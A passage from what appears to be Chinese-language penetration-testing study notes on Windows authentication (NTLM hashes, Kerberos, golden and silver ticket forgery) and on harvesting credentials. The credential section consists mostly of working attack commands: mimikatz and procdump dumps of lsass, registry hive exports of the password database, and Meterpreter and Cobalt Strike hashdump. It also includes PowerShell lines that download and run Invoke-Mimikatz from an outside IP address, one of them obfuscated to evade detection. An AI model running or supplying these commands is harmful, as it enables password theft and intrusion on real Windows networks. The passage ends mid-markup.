我们不能直接用来进行哈希传递攻击，可以通过<strong>暴力破解来获取明文密码</strong>）</p><blockquote><p>hash传递攻击：在讲到pth（pass the hash）的时候会讲到</p></blockquote><p>其中的关键点在于：第二步质询的操作中客户端发送给服务端的是 <strong>NTLM  哈希值与随机字符串加密的结果</strong>Response，而这个 <u>NTLM  哈希是由用户输入的密码本地计算得出的</u>，所以在这个步骤中，只要能提供正确的 NTLM  哈希即使不知道正确的密码也可通过认证!!</p><h3 id="Net-NTLM-Hash的破解"><a href="#Net-NTLM-Hash的破解" class="headerlink" title="Net NTLM Hash的破解"></a>Net NTLM Hash的破解</h3><p>需要用到hash密码破解的神器——hashcat，支持破解的协议非常的多</p><blockquote><p><a href="https://hashcat.net/wiki/doku.php">https://hashcat.net/wiki/doku.php</a>?</p><p>Hashcat的使用手册总结：<a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p></blockquote><p>下面使常见的参数，想了解更多的参数可以hashcat –help查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span><br><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span><br><span class="line">--remove     删除已被破解成功的hash</span><br><span class="line">-r       使用自定义破解规则</span><br></pre></td></tr></table></figure><p>NTLMv2的格式为：  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 net-ntlm /tmp/password.list -o found.txt --force</span><br><span class="line">-m：hash-type即hash使用的协议，5600对应的是NetNTLMv2。详细支持的协议的参数可查表</span><br><span class="line">-o：输出文件 字典文件为/tmp/password.list</span><br><span class="line">--force：代表强制执行，测试系统不支持Intel OpenCL</span><br></pre></td></tr></table></figure><h2 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h2><p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与<br>参与域认证的三个角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</li></ul><p>从物理层面看，AD与AS，TGS，KDC均为域控制器(Domain Controller)。</p><h3 id="Kerberos认证协议的基础概念"><a href="#Kerberos认证协议的基础概念" class="headerlink" title="Kerberos认证协议的基础概念"></a>Kerberos认证协议的基础概念</h3><ul><li>票据(Ticket):</li></ul><p>是网络对象互相访问的凭证。</p><ul><li>TGT(Ticket Granting Ticket):</li></ul><p>看英文名就知道，用来生成Ticket的Ticket</p><ul><li>AD(Account Database):</li></ul><p>存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库，KDC可以从AD中提取域中所有用户的NTLM Hash，这是Kerberos协议能够成功实现的基础。</p><ul><li>KDC(Key Distribution Center):</li></ul><p>密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS和TGS</p><ul><li>AS(Authentication Server):</li></ul><p>身份认证服务，为Client生成TGT的服务，也用来完成对Client的身份验证</p><ul><li>TGS(Ticket Granting Server):</li></ul><p>票据授予服务,为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务，该服务提供的票据也称为 TGS 或者叫白银票据</p><ul><li>TGT(Ticket Granting Ticket):</li></ul><p>由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时</p><p>注意：</p><p>Client 密钥 TGS密钥 和 Service 密钥 均为对应用户的NTLM Hash</p><p>TGS密钥 &#x3D;&#x3D; KDC Hash &#x3D;&#x3D; krbtgt用户的NTLM Hash</p><p>Server 和 Service可以当作一个东西，就是Client想要访问的服务器或者服务</p><p>Client&#x2F;(TGS&#x2F;Server) Sessionkey 可以看作客户端与TGS服务和尝试登陆的Server之间会话时用来加密的密钥，而(Client&#x2F;TGS&#x2F;Service)密钥(上面提到的三个实际为NTLM Hash的密钥)是用来加密会话密钥的密钥，为了保证会话密钥的传输安全，这些加密方式均为对称加密</p><p>参与认证的三个角色的 NTLM Hash  是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥 Sessionkey  的安全传输</p><h3 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h3><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是否是可信赖的， 也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。</p><p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（TGS服务的任务）</p><p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向KDC重新申请。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355638.png" alt="image-20220809164958412" style="zoom:50%;" /><h4 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1. 用户登录"></a>1. 用户登录</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355621.png" alt="image-20220809165025241" style="zoom:50%;" /><ul><li>用户输入 [用户名] 和 [密码] 信息</li><li>在客户端，用户输入的 [密码] 通过计算生成NTLM哈希作做为 [CLIENT密钥]</li></ul><h4 id="2-请求身份认证"><a href="#2-请求身份认证" class="headerlink" title="2. 请求身份认证"></a>2. 请求身份认证</h4><h5 id="2-1-客户端向AS-身份认证服务-发送认证请求"><a href="#2-1-客户端向AS-身份认证服务-发送认证请求" class="headerlink" title="2.1 客户端向AS(身份认证服务)发送认证请求"></a>2.1 客户端向AS(身份认证服务)发送认证请求</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355763.png" alt="image-20220809171208401" style="zoom:50%;" /><ul><li>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息</li></ul><blockquote><p>此时并未发送[密码]或[密钥]信息</p></blockquote><h5 id="2-2-AS确认Client端登录者用户身份"><a href="#2-2-AS确认Client端登录者用户身份" class="headerlink" title="2.2 AS确认Client端登录者用户身份"></a>2.2 AS确认Client端登录者用户身份</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355771.png" alt="image-20220809171311572" style="zoom: 50%;" /><ol><li><p>AS收到用户认证请求之后，根据请求中的 用户名 信息，从数据库中查找该用户名是否存在。</p></li><li><p>如果 用户名 存在，则根据该用户名提取NTLM Hash做为AS生成的CLIENT 密钥，如果第1步中用户提供的 密码 信息正确，该秘钥与用户登录中的 CLIENT密钥 是相等的。</p></li><li><p>AS为Client响应如下消息：</p></li></ol><ul><li>Msg A 使用 KDC生成的CLIENT密钥 加密的CLIENT&#x2F;TGS SESSIONKEY</li><li>Msg B 使用 TGS密钥 加密的TGT(TICKET-GRANTING-TICKET)，客户端没有</li><li>KDC NTLM Hash因此Client无法解密TGT。</li><li>TGT中包含如下信息：</li></ul><blockquote><p>[Client&#x2F;TGS SessionKey]<br>Client ID<br>Ticket有效时间<br>CLient 地址</p></blockquote><ol start="4"><li>Client收到AS的响应消息以后，利用自身的 CLIENT密钥 可以对Msg A进行解密，这样可以获取到 CLIENT&#x2F;TGS SESSIONKEY 。但由于Msg B是使用 TGS密钥 加密的，Client无法对其解密。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355688.png" alt="image-20220809171642114" style="zoom:50%;" /><blockquote><ul><li>AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。</li><li>Client&#x2F;TGS SessionKey出现了两个Copy，一个给Client端，一个给TGS端。</li><li>认证过程中的加密除哈希外均采用的是对称加密算法</li></ul></blockquote><h4 id="3-请求服务授权"><a href="#3-请求服务授权" class="headerlink" title="3. 请求服务授权"></a>3. 请求服务授权</h4><h5 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355676.png" alt="image-20220809171738168" style="zoom:50%;" /><p>客户端发送的请求中包含如下两个消息：</p><ul><li>Msg C</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要请求的服务ID, 即[Service ID]</span><br><span class="line">上一步2.2中由AS为Client提供的TGT</span><br></pre></td></tr></table></figure><ul><li>Msg D</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 CLIENT/TGS SESSIONKEY 加密的Authenticator 1 &#123;Client ID, Timestamp&#125;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355646.png" alt="image-20220809171856218" style="zoom:50%;" /><p>KDC接收到TGT与其他内容后，会首先使用KDC 的NTLM Hash解密TGT，只有KDC可以解密TGT，从TGT中提取到 CLIENT&#x2F;TGS SESSIONKEY ，再使用 CLIENT&#x2F;TGS SESSIONKEY 解密Authenticator 1，获取到{Client ID, imestamp} 并与通过解密TGT获取到的{Client ID, 有效时间}进行对比</p><h6 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h6><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355594.png" alt="image-20220809171942456" style="zoom:50%;" /><p>TGS为Client响应的消息包括：</p><ul><li>Msg E 使用 SERVICE密钥(服务器的NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Client/Server SessionKey]</span><br><span class="line">Client网络地址</span><br><span class="line">Ticket有效时间</span><br><span class="line">Client ID</span><br></pre></td></tr></table></figure><ul><li>Msg F 使用 CLIENT&#x2F;TGS SESSIONKEY 加密的 CLIENT&#x2F;SERVER SESSIONKEY 。</li></ul><p>Msg F使用了 CLIENT&#x2F;TGS SESSIONKEY 加密，因此，该消息对Client可见。Client对其解密以后可获取到 CLIENT&#x2F;SERVER SESSIONKEY 。<br>而Msg E使用了 [SERVICE密钥] 加密，该消息可视作是TGS给Service Server的消息，只不过由Client一起携带发送给Service Server</p><h4 id="4-发送服务请求"><a href="#4-发送服务请求" class="headerlink" title="4. 发送服务请求"></a>4. 发送服务请求</h4><h5 id="4-1-Client向Service-Server发送服务请求"><a href="#4-1-Client向Service-Server发送服务请求" class="headerlink" title="4.1 Client向Service Server发送服务请求"></a>4.1 Client向Service Server发送服务请求</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355685.png" alt="image-20220809172116925" style="zoom:50%;" /><p>发送的消息中包括：</p><ul><li>Msg E 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li><li>Msg G 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul><blockquote><ol><li>CLIENT&#x2F;SERVER SESSIONKEY 并非直接传输，而是被包含在使用[Service密钥]加密的Msg E中。</li><li>既然 [CLIENT&#x2F;SERVER SESSIONKEY] 并不直接明文传输， Client需要向Service Server证明自己拥有正确的 CLIENT&#x2F;SERVER SESSIONKEY ，所以，Authenticator 2使用了 CLIENT&#x2F;SERVER SESSIONKEY 加密。</li></ol></blockquote><h5 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h5><ol><li>SS收到客户端的服务请求之后，先利用自身的 [SERVICE密钥] 对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了 CLIENT&#x2F;SERVER SESSIONKEY 以及Client ID信息。</li><li>SS使用 CLIENT&#x2F;SERVER SESSIONKEY 解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的 CLIENT&#x2F;SERVER SESSIONKEY 。</li><li>而后，SS向Client响应Msg H(包含使用 CLIENT&#x2F;SERVER SESSIONKEY 加密的Timestamp信息)。</li><li>Client收到SS的响应消息Msg H之后，再使用 CLIENT&#x2F;SERVER SESSIONKEY 对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。</li></ol><p>如上信息可以看出来，该交互过程起到了Client与SS之间的“双向认证”作用。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355614.png" alt="image-20220809172331198" style="zoom:50%;" /><h2 id="票据伪造的原理"><a href="#票据伪造的原理" class="headerlink" title="票据伪造的原理"></a>票据伪造的原理</h2><ul><li>2.2 AS确认Client端登录者用户身份</li></ul><p>KDC返回的Msg B：使用 TGS密钥(KDCHASH&#x2F;KRBTGT用户NTLMHASH) 加密的TGT(Ticket-Granting-Ticket)，当我们获取到krbtgt用户的NTLM哈希后，便可主动使用krbtgt用户的NTLM哈希做为TGS密钥来生成TGT发送给KDC，这样KDC如果通过解密伪造TGT获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY] 可以成功解密 Authenticator 1 并完成与TGT中的数据进行比对，便成功骗过了KDC，也就是成功伪造了黄金票据</p><ul><li>4.1 Client向SS(Service Server)发送服务请求</li></ul><p>客户端向服务器发送的为使用 SERVICE密钥(服务器的NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET Ticket中包含用来供服务器解密Authenticator 2的 CLIENT&#x2F;SERVER SESSIONKEY 。如果获取到了Service Server的NTLM<br>Hash，便可伪造Ticket，和Authenticator 2 ，Service Server在接收到Ticket和Authenticator 2后可以使用自己的NTLM Hash正常解密完成比对，也就是成功伪造了白银票据</p><p>关于Service Hash，Service Hash其实是目标中一个用户名与hostname相同的用户的Hash<br>如hostname为PC-WIN7的服务器，对应的Hash就是Username : PC-WIN7$的哈希</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141410834.png" alt="image-20220809172642251" style="zoom:50%;" /><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p>Windows下的密码hash——NTLM hash和Net-NTLM hash介绍<br>彻底理解Windows认证 - 议题解读 « 倾旋的博客</p></blockquote><h1 id="Windows密码凭证获取"><a href="#Windows密码凭证获取" class="headerlink" title="Windows密码凭证获取"></a>Windows密码凭证获取</h1><p>Windows的密码一般存在syskey加密过后的系统文件中（SAM文件）或者是注册表中</p><h2 id="Token窃取与利用"><a href="#Token窃取与利用" class="headerlink" title="Token窃取与利用"></a>Token窃取与利用</h2><p>Windows有两种类型的token：</p><ul><li>Delegation Token（授权令牌）:用来交互会话（用户直接登录，远程桌面登录）</li><li>Impresonation Token（模拟令牌）：用于非交互登录（利用net user访问共享文件夹）</li></ul><p>两种token只在系统注销重启后清除</p><p>具有Delegation Token的用户在注销后，该token将变成impersonation token，依旧有效。</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><blockquote><p>通过Dpapi获取Windows身份凭证<a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></p><p>Mimikatz之DPAPI学习与实践<a href="https://zhuanlan.zhihu.com/p/43888078">https://zhuanlan.zhihu.com/p/43888078</a></p></blockquote><h3 id="Dpapi简述"><a href="#Dpapi简述" class="headerlink" title="Dpapi简述"></a>Dpapi简述</h3><p>从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 以用作敏感信息的加密解密。</p><p>其用作范围包括且不限于：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li><li>EFS</li><li>EAP&#x2F;TLS 和 802.1x的身份凭证</li><li>Credential Manager中的数据</li><li>以及各种调用了CryptProtectData函数加密数据的第三方应用，如Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk等。</li><li>etc</li></ul><p>由于功能需求，Dpapi采用的加密类型为对称加密，所以只要找到了密钥(Master Key )，就能解开物理存储的加密信息了。</p><h3 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h3><p>存放密钥的文件则被称之为<code>Master Key Files</code>，其路径一般为<code>%APPDATA%/Microsoft/Protect/%SID%</code>。而这个文件中的密钥实际上是<strong>随机64位字节码经过用户密码等信息的加密后的密文</strong>，所以只需要有用户的明文密码&#x2F;Ntlm&#x2F;Sha1就可以还原了。</p><h2 id="系统用户凭证获取"><a href="#系统用户凭证获取" class="headerlink" title="系统用户凭证获取"></a>系统用户凭证获取</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li><strong>win7和win10mimikatz的使用会存在区别</strong></li><li>要有管理员权限 普通用户无法获取密码</li><li>mimikatz原理就是从系统lsass.exe进程中获取明文密码或者hash，得要用户登录才能从中获取</li></ul><h4 id="mimikatz-for-Win10下载："><a href="#mimikatz-for-Win10下载：" class="headerlink" title="mimikatz for Win10下载："></a>mimikatz for Win10下载：</h4><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p></blockquote><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看mimikatz可以用哪些命令，随便敲两个或者一个：</span><br><span class="line">::查看高级命令模块</span><br><span class="line">：查看基本命令</span><br><span class="line">#选定某个模块后，比如privilege之后，可以继续输入两个::查看具体用法如privilege::</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="本地非交互式凭证获取："><a href="#本地非交互式凭证获取：" class="headerlink" title="本地非交互式凭证获取："></a>本地非交互式凭证获取：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line">win7:</span><br><span class="line">mimikatz.exe &quot;log logon.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h4 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0版本</span><br><span class="line">privilege::debug    </span><br><span class="line">//提升权限,提升到调试权限，才能获取到lsass.exe进程中保存的密码。另外需要有管理员权限才能提升至debug</span><br><span class="line">sekurlsa::logonpasswords    </span><br><span class="line">//抓取密码</span><br><span class="line">1.X版本</span><br><span class="line">privilege::debug    //提升权限</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   //将 sekurlsa.dll 注入到 lsass.exe 进程里</span><br><span class="line">@getLogonPasswords     //获取密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate#窃取、冒充令牌,获取与令牌对应的权限，该命令可以查看我们可以窃取哪些token</span><br><span class="line">lsadump::sam#列出密码凭证及用户信息,可以得到一些ntml hash </span><br><span class="line">#拿到hash后就可以尝试解析明文或者hash传递攻击</span><br><span class="line">lsadump::secrets#Get the SysKey to decrypt SECRETS entries (from registry or hives)</span><br><span class="line">   #获取系统密钥以解密文条目（从注册表或配置单元获取）</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">win7：可以直接获得明文密码</span><br><span class="line">privilege::debug    </span><br><span class="line">sekurlsa::logonpasswords </span><br></pre></td></tr></table></figure><h3 id="Powershell脚本"><a href="#Powershell脚本" class="headerlink" title="Powershell脚本"></a>Powershell脚本</h3><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a><br><a href="https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1</a></p></blockquote><p>Powershell本地加载mimikatz脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;&#x27;</span><br></pre></td></tr></table></figure><p>Powershell远程加载mimikatz脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://47.101.214.85:8000/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure><p>powershell混淆:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;47.101.214&#x27;+&#x27;.85:8000/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure><p>Powershell 加载 Get-PassHashes脚本：</p><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object net.webclient).downloadstring(&#x27;http://47.101.214.85:8000/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure><h3 id="procdump-mimikatz"><a href="#procdump-mimikatz" class="headerlink" title="procdump+mimikatz"></a>procdump+mimikatz</h3><p>Procdump下载： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br>Procdump lsass  进程导出:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For 32bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">For 64bits：</span><br><span class="line">procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后使用 mimikatz  还原密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h3 id="注册表导出Hash"><a href="#注册表导出Hash" class="headerlink" title="注册表导出Hash"></a>注册表导出Hash</h3><p>reg save命令 保存注册表</p><p>HKLM是HKEY_LOCAL_MACHINE的缩写</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208072236447.png" alt="image-20220807223639163" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们解析sam.hiv需要使用system.hiv中的key，所以需要先解密system.hiv</span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure><p>mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure><p>impacket：</p><blockquote><p><a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">https://github.com/SecureAuthCorp/impacket/tree/master/examples</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><blockquote><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line"># 如果提示找不到 Crypto 模块， 就到 pip包安装位置C:\Users\[User]\AppData\Roaming\Python\Python38\site-packages把crypto文件夹重命名为Crypto</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290811830.png" alt="image-20220729081127638"></p><h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3><ul><li>Hashdump</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump    //system权限的meterpreter</span><br><span class="line">set session 1</span><br><span class="line">exploit //结果保存在tmp目录下</span><br><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>Hash格式： 用户名称:RID:LM-HASH值:NTLM-HASH值</p><ul><li>Mimikatz</li></ul><p>Hashdump 使用的是 mimikatz 的部分功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load mimikatz   //加载模块</span><br><span class="line">wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp    //获取用户密码的hash值</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f ::   //查询有哪些模块</span><br><span class="line">mimikatz_command -f  samdump::hashes    //从windows的sam文件中读取密码hash值</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords   //获取明文密码</span><br><span class="line">mimikatz_command -f samdump::bootkey</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msf6</span><br><span class="line">load kiwi</span><br><span class="line">help kiwi</span><br><span class="line">creds_all  //列举系统中的明文密码</span><br><span class="line">lsa_dump_sam  //读取sam文件</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords  //kiwi_cmd命令后面接mimikatz的命令</span><br></pre></td></tr></table></figure><h3 id="CobaltStrike获取Hash"><a href="#CobaltStrike获取Hash" class="headerlink" title="CobaltStrike获取Hash"></a>CobaltStrike获取Hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="其他密码凭证获取"><a href="#其他密码凭证获取" class="headerlink" title="其他密码凭证获取"></a>其他密码凭证获取</h2><h3 id="1-RDP连接密码解密"><a href="#1-RDP连接密码解密" class="headerlink" title="1 RDP连接密码解密"></a>1 RDP连接密码解密</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul><li>查看本地机器本地连接过的目标机器。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure><ul><li>查看本地用户此目录下是否存有RDP密码文件</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1E85A94EE31F584E484B8120E3ADA266</span><br><span class="line">9D4E7B34E2541E8AB9F716D127DFFC87</span><br><span 